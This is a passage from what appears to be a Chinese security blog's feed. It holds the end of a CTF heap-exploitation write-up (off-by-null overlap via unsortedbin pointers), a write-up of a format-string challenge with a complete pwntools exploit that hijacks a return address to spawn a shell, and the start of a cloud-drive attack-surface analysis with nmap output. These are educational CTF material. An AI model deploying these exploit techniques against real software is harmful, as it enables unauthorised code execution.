(tttang.com)</a>这篇文章给的poc进行调整利用的，虽然做出来了但对于其中的构造还是没有弄太清楚，所以还需要仔细分析一下。前面提到的利用largebin来进行绕过需要爆破，而这篇文章中介绍的利用unsortedbin无需爆破。</p><p>构造overlap chunk需要以下步骤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x418</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x100</span>) <span class="comment">#0 </span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment">#1 </span></span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">&quot;B0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#2 </span></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">&quot;C0&quot;</span>*<span class="number">0x100</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#4 </span></span><br><span class="line">add(<span class="number">0x488</span>, <span class="string">&quot;H&quot;</span>*<span class="number">0x100</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x428</span>, <span class="string">&quot;D&quot;</span>*<span class="number">0x100</span>) <span class="comment"># 6 </span></span><br><span class="line">add(<span class="number">0x108</span>) <span class="comment"># 7 barrier</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x438</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x418</span> + p64(<span class="number">0x551</span>)[:-<span class="number">2</span>]) <span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>)  <span class="comment">#2 </span></span><br><span class="line">add(<span class="number">0x428</span>)  <span class="comment">#3 </span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&quot;0&quot;</span>*<span class="number">0x100</span>)  <span class="comment">#6 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>) </span><br><span class="line">delete(<span class="number">2</span>) </span><br><span class="line">add(<span class="number">0x418</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment"># </span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x500</span>-<span class="number">8</span>, <span class="string">&#x27;6&#x27;</span>*<span class="number">0x488</span> + p64(<span class="number">0x431</span>)) <span class="comment">#2 </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3b0</span>) <span class="comment">#3 </span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0x550</span>))</span><br><span class="line">add(<span class="number">0x418</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>逐步分析</p><p>首先分配如下chunk</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219150240330.png" alt="image-20231219150240330"></p><p>按照0，3，6，2的顺序将chunk free掉</p><p>首先free 0</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219151719269.png" alt="image-20231219151719269"></p><p>放入到unsortedbin</p><p>接着free 3，chunk3被加入到链表头，fd指向chunk0，chunk0的bk指针指向chunk3</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219151954174.png" alt="image-20231219151954174"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219152050155.png" alt="image-20231219152050155"></p><p>然后free 6，chunk6被加入到链表头，fd指向chunk3</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219152204847.png" alt="image-20231219152204847"></p><p>chunk3的fd指向chunk0，bk指向chunk6</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219152245264.png" alt="image-20231219152245264"></p><p>chunk0的bk指向chunk3</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219152635514.png" alt="image-20231219152635514"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219152728015.png" alt="image-20231219152728015"></p><p>最后free chunk2，由于chunk2和chunk3相邻，所以会合并，chunk2的fd指向chunk6</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219152812879.png" alt="image-20231219152812879"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219152906995.png" alt="image-20231219152906995"></p><p>这一轮free之后，借助unsortedbin我们在堆中留下了地址信息。</p><p>然后我们开始伪造fakechunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x438, &#x27;a&#x27; * 0x418 + p32(0x551)[:-2]) #0</span><br></pre></td></tr></table></figure><p>从0x861的chunk中切下来一块，利用chunk3的残留指针信息伪造fakechunk，如下图</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219154444139.png" alt="image-20231219154444139"></p><p>伪造的chunksize为0x551，fd指向chunk0，bk指向chunk6。</p><p>然后再将剩余的unsortedbin全部取出来，此时堆如下图</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219171335455.png" alt="image-20231219171335455"></p><p>fake_chunk有了，接下来构造<code>fake_chunk-&gt;fd-&gt;bk==fake_chunk</code>以及<code>fake_chunk-&gt;bk-&gt;fd==fake_chunk</code></p><p>fakechunk的fd指向chunk0(重新申请unsortedbin之后，chunk0变为了chunk6)，所以需要将chunk0的bk指向fakechunk，也是利用unsortedbin的残留指针</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219173717769.png" alt="image-20231219173717769"></p><p>fakechunk下方的chunk2的地址和fakechunk相差在0x100范围内，且fakechunk的地址末尾是00，所以可以使用chunk2和chunk6构成一个链表，在chunk6的的bk指针中写入chunk2的地址，再申请回来，利用写入附带的0，将bk指针修改为指向fakechunk，如下图所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219174511076.png" alt="image-20231219174511076"></p><p>此时即可绕过第一个检查<code>fake_chunk-&gt;fd-&gt;bk==fake_chunk</code>。</p><p>fakechunk的bk指针指向chunk6(重新申请unsortedbin之后，chunk6变为了chunk3)，依然是故技重施，利用chunk6和chunk3形成一个链表，往chunk3的fd中写入chunk6的地址，但由于add功能至少要写入1个字节加1个00字符，所以直接将chunk3申请出来会破坏掉fd指针；这里还需要将chunk3上方的chunk5也free掉，然后chunk5和chunk3合并为一个大chunk，然后再从这快大chunk中切割，覆盖掉原有的chunk3的size位，利用多写的一个0字符就可以修改fd指针。</p><p>如下图所示：</p><p>覆盖前</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219195841909.png" alt="image-20231219195841909"></p><p>覆盖后</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219195918975.png" alt="image-20231219195918975"></p><p>如此一来，<code>fake_chunk-&gt;fd-&gt;bk==fake_chunk</code>以及<code>fake_chunk-&gt;bk-&gt;fd==fake_chunk</code>的要求就都满足了</p><p>接下来只需要在在fakechunk的下一个chunk中伪造好prev_size，并进行off-by-null即可，如下图</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219200247087.png" alt="image-20231219200247087"></p><p>整体构造图如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219200443015.png" alt="image-20231219200443015"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219200603590.png" alt="image-20231219200603590"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219200714537.png" alt="image-20231219200714537"></p><p>很巧妙的做法，利用unsortedbin的残留指针绕过检查，并且不需要爆破，学到了。</p><h2 id="0x1D-拟态强网决赛-fmt-【格式化字符串修改不存在的指针】"><a href="#0x1D-拟态强网决赛-fmt-【格式化字符串修改不存在的指针】" class="headerlink" title="0x1D.拟态强网决赛 fmt 【格式化字符串修改不存在的指针】"></a>0x1D.拟态强网决赛 fmt 【格式化字符串修改不存在的指针】</h2><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219201856066.png" alt="image-20231219201856066"></p><p>给了栈地址的末尾两字节，然后读取0x100字节，一次格式化字符串的机会，而且格式化字符串是在bss段不在栈上，之后使用_exit(0)退出程序。</p><p>众所周知，不在栈上的格式化字符串需要找到一条栈链，如下图所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219202627856.png" alt="image-20231219202627856"></p><p>通过对栈链的间接修改，从而修改我们想要修改的内存的数据。而对于栈链的修改通常需要2次或者以上的printf才能达到我们的目的，然而对于本题只有一次printf的机会，该如何进行返回地址的修改呢？</p><p>首先看看保护</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219205036315.png" alt="image-20231219205036315"></p><p>有用的全开了，所以还是老老实实改返回地址吧。</p><p>我们正常修改一个内存值，使用<code>%Xc%$Yhn</code>这样的格式化字符串,%$Y用于指定要往格式化字符串的第几个内存中写入数据，然而如果想要在一次printf中多次修改的话，需要做一点改动。</p><p>我们需要做两步，第一步是修改偏移0x40处的栈链</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231220115234122.png" alt="image-20231220115234122"></p><p>使得栈链能够指向返回地址，如下图所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231220115508656.png" alt="image-20231220115508656"></p><p>然后再修改0x130偏移处的栈链，进而修改printf的返回地址。</p><p>我们使用如下的payload，来在一次printf中完整两个栈链的修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret_end-<span class="number">11</span>)+<span class="string">&#x27;c&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%c&#x27;</span>*<span class="number">11</span></span><br><span class="line">payload+=<span class="string">&#x27;%hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10023</span>-ret_end)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%43$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第一次修改不使用<code>%Xc%Y$hhn</code>，<code>%Y$</code>用于指定要写入的偏移，比如<code>%11$</code>就是格式化字符串的第11个偏移量，在第一次修改中不使用<code>$</code>来指定偏移，而是使用连续的%来堆叠偏移，使用hn来进行写入的时候，如果没有<code>$</code>，就会根据hn前面出现的%数量来确定写入的偏移，如果hn前面有11个%，同样能够实现<code>%11$hn</code>的效果，所以这一段payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret_end-<span class="number">11</span>)+<span class="string">&#x27;c&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%c&#x27;</span>*<span class="number">11</span></span><br><span class="line">payload+=<span class="string">&#x27;%hn&#x27;</span></span><br></pre></td></tr></table></figure><p>实现的也是<code>&#39;%&#39;+str(ret_end-11)+&#39;c&#39;+&#39;%11$hn&#39;</code>的效果。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231220142453145.png" alt="image-20231220142453145"></p><p>第一条栈链使用<code>%13$p</code>来寻找，上面的payload中，hn之前出现了13个%，为什么是<code>&#39;%&#39;+str(ret_end-11)+&#39;c&#39;</code>呢，因为后面还用了11个%c，输出了11个字符。</p><p>修改第二条栈链就不需要使用这种形式了，按照正常格式改就可以。至于为什么第一条栈链的修改不能使用$，暂时还不清楚，可能和%n的使用有关。</p><p>发送这样的payload之后，就可以修改printf的返回地址到main函数，顺便再泄露libc地址和栈地址</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231220143947836.png" alt="image-20231220143947836"></p><p>该怎么样进行利用呢，毕竟返回地址只有一个，总不能一边修改返回地址为main，一边修改返回地址为onegadget吧。</p><p>在栈空间中，我们可以找到多条栈链</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231220161512560.png" alt="image-20231220161512560"></p><p>第一条栈链用于修改printf的返回地址，第二条栈链用于将返回地址的下一个地址修改为onegadget，最后再将返回地址修改为ret，这样printf执行完之后就会执行ret滑向onegadget,如下图所示</p><p>ret用的是万能gadget的末尾</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231220212609095.png" alt="image-20231220212609095"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231220212640479.png" alt="image-20231220212640479"></p><p>返回地址被修改为了ret的地址，ret之后就是onegadget。</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Gift: &#x27;</span>)</span><br><span class="line">stack_end=<span class="built_in">int</span>(io.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">ret_end=stack_end-<span class="number">0xc</span></span><br><span class="line">log.info(<span class="string">&quot;stack_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(stack_end))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret_end-<span class="number">9</span>)+<span class="string">&#x27;c&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%c&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload+=<span class="string">&#x27;%hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10023</span>-ret_end)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&#x27;%9$p%11$p%13$p&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">stack_addr=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">pro_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x00000000000011A9</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.info(<span class="string">&quot;stack_addr =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_addr)))</span><br><span class="line">log.info(<span class="string">&quot;pro_base =&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pro_base)))</span><br><span class="line">ret_next_addr=stack_addr-<span class="number">0x108</span></span><br><span class="line">onegadget=libc_base+<span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>)+<span class="string">&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ret_next_addr&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>)+<span class="string">&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>)+<span class="string">&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((onegadget&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>)+<span class="string">&#x27;c%41$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>)+<span class="string">&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((ret_next_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>)+<span class="string">&#x27;c%27$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>) </span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>)+<span class="string">&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((onegadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>)+<span class="string">&#x27;c%41$hn\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>)+<span class="string">&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((ret_next_addr+<span class="number">4</span>)&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>)+<span class="string">&#x27;c%27$hn\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x23</span>)+<span class="string">&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((onegadget&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffff</span>)-<span class="number">0x23</span>)+<span class="string">&#x27;c%41$hn\x00&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xc4</span>)+<span class="string">&#x27;c%39$hhn\x00&#x27;</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x1-CISCN2022-newest-note-【整数溢出，UAF】&quot;&gt;&lt;a href=&quot;#0x1-CISCN2022-newest-note-【整数溢出，UAF】&quot; class=&quot;headerlink&quot; title=&quot;0x1.CISCN2022 newest</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>某云盘分析</title>
    <link href="http://example.com/2024/01/09/%E6%9F%90%E4%BA%91%E7%9B%98%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/01/09/%E6%9F%90%E4%BA%91%E7%9B%98%E5%88%86%E6%9E%90/</id>
    <published>2024-01-09T13:31:34.000Z</published>
    <updated>2024-03-14T06:43:43.805Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-攻击面分析"><a href="#1-攻击面分析" class="headerlink" title="1.攻击面分析"></a>1.攻击面分析</h1><p>扫描所有的TCP端口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -A -p- 192.168.124.14</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-13 19:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.124.14</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65522 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">80/tcp    open  http        nginx 1.16.1</span><br><span class="line">|_http-server-header: nginx/1.16.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">111/tcp   open  rpcbind     2 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2            111/tcp   rpcbind</span><br><span class="line">|_  100000  2            111/udp   rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">443/tcp   open  ssl/http    nginx 1.16.1</span><br><span class="line">|_http-server-header: nginx/1.16.1</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU</span><br><span class="line">| Not valid before: 2021-11-01T08:48:38</span><br><span class="line">|_Not valid after:  2021-12-01T08:48:38</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.6.11 (workgroup: WORKGROUP)</span><br><span class="line">1883/tcp  open  mqtt?</span><br><span class="line">| mqtt-subscribe: </span><br><span class="line">|_  ERROR: </span><br><span class="line">6900/tcp  open  http        nginx 1.16.1</span><br><span class="line">|_http-title: 502 Bad Gateway</span><br><span class="line">|_http-server-header: nginx/1.16.1</span><br><span class="line">6901/tcp  open  http        nginx 1.16.1</span><br><span class="line">|_http-server-header: nginx/1.16.1</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/debug).</span></span><br><span class="line"><span class="string">7000/tcp  open  http        nginx 1.16.1</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/debug).</span><br><span class="line">|_http-server-header: nginx/1.16.1</span><br><span class="line">16800/tcp open  ssl/http    nginx 1.16.1</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent time</span><br><span class="line">|_http-server-header: nginx/1.16.1</span><br><span class="line">|_http-title: 502 Bad Gateway</span><br><span class="line">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU</span><br><span class="line">| Not valid before: 2021-11-01T08:48:38</span><br><span class="line">|_Not valid after:  2021-12-01T08:48:38</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">16900/tcp open  ssl/http    nginx 1.16.1</span><br><span class="line">| 